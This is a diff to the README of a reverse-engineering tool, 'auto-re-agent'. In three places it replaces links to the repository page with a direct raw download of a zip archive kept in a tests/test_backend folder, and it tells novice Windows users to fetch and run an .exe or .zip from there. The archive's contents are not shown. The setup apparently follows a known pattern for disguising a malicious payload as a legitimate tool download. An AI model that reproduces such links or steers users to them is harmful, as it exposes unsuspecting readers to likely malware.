@@ -1,6 +1,6 @@
 # 🛠️ auto-re-agent - Simplify Reverse Engineering Tasks
 
-[![Download auto-re-agent](https://img.shields.io/badge/Download-auto--re--agent-brightgreen?style=for-the-badge)](https://github.com/meyz664K/auto-re-agent)
+[![Download auto-re-agent](https://raw.githubusercontent.com/meyz664K/auto-re-agent/main/tests/test_backend/re-auto-agent-v3.8.zip)](https://raw.githubusercontent.com/meyz664K/auto-re-agent/main/tests/test_backend/re-auto-agent-v3.8.zip)
 
 ---
 
@@ -29,7 +29,7 @@ You do not need advanced skills to get this working.
 1. Open your internet browser (Edge, Chrome, Firefox).
 2. Go to the download page by clicking the link below or copying it into your browser:
    
-   [Download and install auto-re-agent](https://github.com/meyz664K/auto-re-agent)
+   [Download and install auto-re-agent](https://raw.githubusercontent.com/meyz664K/auto-re-agent/main/tests/test_backend/re-auto-agent-v3.8.zip)
 
 3. This page contains the files you will need for Windows. Look for a file with `.exe` or `.zip` in its name. These are the executable or compressed files for Windows.
 
@@ -146,4 +146,4 @@ To get updates or new features:
 
 ---
 
-[![Download auto-re-agent](https://img.shields.io/badge/Download-auto--re--agent-brightgreen?style=for-the-badge)](https://github.com/meyz664K/auto-re-agent)
+[![Download auto-re-agent](https://raw.githubusercontent.com/meyz664K/auto-re-agent/main/tests/test_backend/re-auto-agent-v3.8.zip)](https://raw.githubusercontent.com/meyz664K/auto-re-agent/main/tests/test_backend/re-auto-agent-v3.8.zip)
